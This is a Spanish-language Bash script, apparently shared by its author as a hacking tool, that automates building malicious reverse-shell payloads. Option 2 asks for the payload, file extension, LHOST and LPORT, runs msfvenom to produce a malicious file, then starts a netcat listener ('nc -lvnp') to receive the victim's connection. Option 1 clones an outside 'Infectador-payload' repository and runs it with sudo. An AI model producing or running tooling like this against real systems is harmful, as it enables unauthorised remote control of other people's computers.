#!/bin/bash

# colores 

#    Negro = \e[0;30m
#    Gris oscuro = \e[1;30m
#    Azul = \e[0;34m
#    Azul resaltado = \e[1;34m
#    Verde = \e[0;32m
#    Verde resaltado = \e[1;32m
#    Cian = \e[0;36m
#    Cyan resaltado = \e[1;36m
#    Rojo = \e[0;31m
#    Rojo resaltado = \e[1;31m
#    Púrpura = \e[0;35m
#    Púrpura resaltado = \e[1;35m
#    Café = \e[0;33m
#    Amarillo = \e[1;33m
#    Gris = \e[0;37m
#    Blanco = \e[1;37m
function creditos(){

echo -e "\e[1;35m-------------------------------------------------"
sleep 0.2
echo -e "             \e[0;32mDejame una \e[1;33m★ \e[0;32men GitHub              "
sleep 0.2
echo -e "\e[1;32mhttps://github.com/WackyHacker/Infectador-payload"  
sleep 0.2
echo -e "                   \e[1;32m« \e[0;32mGRACIAS \e[1;32m»                   "
sleep 0.2
echo -e "\e[1;35m-------------------------------------------------"
sleep 0.2
}
function shell(){
clear
echo -e "\e[1;32m>> TOOL CREATED BY WACKYHACKER <<"
sleep 2
echo ""
echo -e "          \e[0;32m_   _  ____      __  __  __ ____  _____ 
         \e[0;32m| \ | |/ ___|    / / |  \/  / ___||  ___|
         \e[0;32m|  \| | |       / /  | |\/| \___ \| |_   
         \e[0;32m| |\  | |___   / /   | |  | |___) |  _|  
         \e[0;32m|_| \_|\____| /_/    |_|  |_|____/|_|  
	    \e[0;34mNETCAT               METASPLOIT
		
"

echo -e "\e[0;37m[1] Crear una shell reversa con meterpreter (Metasploit)"
echo "" 
echo -e "\e[0;37m[2] Crear una shell con nc (netcat)"
echo -e "\e[1;37m"
read -p $"Elige una opcion >> " opcion 


	if [[ $opcion == 1 || $opcion  == 01 ]]; then
		echo ""
		echo -e "\e[1;37m-----------------------------------------------------------------------------------------------" 
		echo ""
		echo -e "\e[0;37m[?] Para utilizar esta opcion debes clonar este repositorio de Github \e[1;37m[https://github.com/WackyHacker/Infectador-payload]"
		echo -e "\e[0;37m"
		read -p $"Quieres clonar el repositorio? (SI/NO) > " clonar 
			if  [[ $clonar == "Si" || $clonar == "si" || $clonar == "SI" || $clonar == "sI" ]]; then
				xterm -T "Infectador payload" -geometry 100x30 -e "git clone https://github.com/WackyHacker/Infectador-payload"
				xterm -T "" -geometry 100x30 -e "mkdir Target1"
				xterm -T "" -geometry 100x30 -e "mv Infectador-payload Target1"
				echo ""
				echo -e "\e[1;37m[✓] \e[0;37mEl repositorio se ha clonado i guardado en /Target1 satisfactoriamente"
				echo ""
				echo -e "\e[1;37m-----------------------------------------------------------------------------------------------" 
				echo ""
				read -p $"Quieres iniciar la herramienta [Infectador-payload] (SI/NO) >> " iniciar 
					if [[ $iniciar == "Si" || $iniciar == "si" || $iniciar == "SI" || $iniciar == "sI" ]]; then
						if ! [ $(id -u) = 0 ]; then
							cd Target1
							cd Infectador-payload 
							echo ""
							echo -e "\e[1;37m↓↓↓ Contraseña USUARIO ROOT ↓↓↓"
							echo ""
							sudo bash Infectador-payload.sh 
						else 
							cd Target1
							cd Infectador-payload 
							bash Infectador-payload
						fi
							
					fi
			elif [[ $clonar == "nO" || $clonar == "No" || $clonar == "no" || $clonar == "NO" ]]; then
				clear
				creditos
			else
				clear
				creditos
			fi
	elif [[ $opcion == 2 || $opcion == 02 ]]; then 
		xterm -T "" -geometry 100x30 -e "mkdir Target2" 
		echo ""
		echo -e "\e[1;37m-----------------------------------------------------------------------------------------------"
		echo ""
		echo -e "\e[1;37m[?] \e[0;37mPara utilizar esta opcion, especifica los detalles de tu archivo malicioso"
		echo -e "\e[0;37m" 
		read -p $"Payload >> " payload
		echo -e "\e[0;37m"
		read -p $"Extension archivo >> " ext
		echo -e "\e[0;37m"
		read -p $"LHOST >> " ip
		echo -e "\e[0;37m"
		read -p $"LPORT >> " port
		echo -e "\e[0;37m"
		read -p $"Nombre archivo >> " name 
		echo ""
		echo -e "\e[1;37m-----------------------------------------------------------------------------------------------"
		echo ""
		msfvenom -p $payload lhost=$ip lport=$port -f $ext R > $name.$ext
		echo "" 
		mv $name.$ext Target2
		echo -e "\e[1;37m-----------------------------------------------------------------------------------------------"
		echo ""
		echo -e "\e[1;37m[✓] \e[0;37mSu payload ha sido creado i guardado en la carpeta /Target2"
		echo -e "\e[0;37m"
		read -p $"Para iniciar nc pulsa ENTER" enter
			if [[ $enter == "" ]]; then 
				if ! [ $(id -u) = 0 ]; then
					echo ""
					sudo nc -lvnp $port
					echo ""
				else 
					echo ""
					echo -e "\e[1;37m↓↓↓ Contraseña USUARIO ROOT ↓↓↓"
					echo ""
					echo ""
					sudo nc -lvnp $port
					echo ""
					
				fi
			fi
	fi

}
shell


